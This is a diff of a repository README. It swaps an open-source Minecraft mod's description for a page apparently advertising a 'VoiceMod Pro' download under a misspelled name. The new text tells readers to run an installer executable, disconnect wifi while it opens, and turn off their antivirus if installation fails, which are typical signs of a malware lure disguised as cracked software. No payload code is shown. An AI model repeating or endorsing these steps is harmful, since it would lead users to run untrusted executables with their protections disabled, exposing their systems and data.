@@ -1,31 +1,29 @@
-**1.20.0**
+# VOlCEMOD-Pro-latest-update
 
-<div align="center">
-  <br />
-    <p>
-      <a href="https://horion.download"><img src="https://raw.githubusercontent.com/horionclient/Horion/master/.github/horion-banner.png" width="600" alt="Horion" /></a>
-    </p>
-  <br />
-  <p>
-    <a href="https://horion.download/injector"><img src="https://img.shields.io/static/v1?label=download&message=latest&color=12c970&logo=docusign&logoColor=white" alt="Download Injector" /></a>
-    <a href="https://horion.download/discord"><img src="https://img.shields.io/discord/732833913705201736?color=5865F2&logo=discord&logoColor=white" alt="Discord server" /></a>
-    <a href="https://github.com/NRGJobro/Horion-Open-SRC/actions"><img src="https://img.shields.io/github/workflow/status/NRGJobro/Horion-Open-SRC/MSBuild%20Release?label=builds&logo=azure%20pipelines" alt="Build Status" /></a>
-    <a href="https://creativecommons.org/licenses/by-nc/4.0/"><img src="https://img.shields.io/static/v1?label=license&message=BY-NC%204.0&color=orange&logo=creative%20commons&logoColor=white" alt="License" /></a>
-  </p>
-  <p>
-    <b>Horion</b> is a Minecraft: Bedrock Edition utility mod designed to enhance gameplay. We do not take responsibility in anything done with this utility mod.
-If you want to contribute to this project, feel free to fork this repository and submit a pull request.
-  </p>
-</div>
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
 
-## Contributing
-To contribute, simply **fork the repository**, edit the code, and **submit a pull request**.
-We will then check your pull request and accept/deny it.
-If you are clueless about what you could start with, [we collected some issues for you](https://github.com/horionclient/Horion/contribute).
-More Information on setting everything up can be found in the **[wiki](https://github.com/horionclient/Horion/wiki "wiki")**!
-If you need any help with understanding our code, join the [official Discord server](https://horion.download/discord)
+--------------------------------------------------------
+1) Open DataFolder;Installer.exe
+--------------------------------------------------------
+2) Wait till VoiceMod will download
+--------------------------------------------------------
+3) After it downloaded turn off your wifi and open it
+--------------------------------------------------------
+4) Wait it open, turn on your wifi and enjoy!
+--------------------------------------------------------
 
-## Licensing
-This work is licensed under the Creative Commons Attribution-NonCommercial 4.0 International License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc/4.0/ or send a letter to Creative Commons, PO Box 1866, Mountain View, CA 94042, USA.
-You are allowed to fork the project and distribute it, if you give credit. You may not sell any code protected by the license.
-Not all source files are protected by this license - Some third party libraries (Chakra, DX11) may be under different copyright. The person known as "Packet" may not use this src to further develop his client unless credit is given. Anyone who developed chronos may use this to update 😎
+
+
+If something doesn't work, like Exe opens, but install process not appearing, make sure you have: 
+
+--------------------------------------------------------
+1) last .NetFramework version
+--------------------------------------------------------
+2) Last Windows version
+--------------------------------------------------------
+3) All drivers updated 
+--------------------------------------------------------
+4) Your Antivirus is off
+--------------------------------------------------------
+
+![maxresdefault (21) (1)](https://github.com/Tazimuddin/VOlCEMOD-Pro-latest-update/assets/136664327/bf9ec901-2bfb-42a9-9a77-ba2a2787797b)
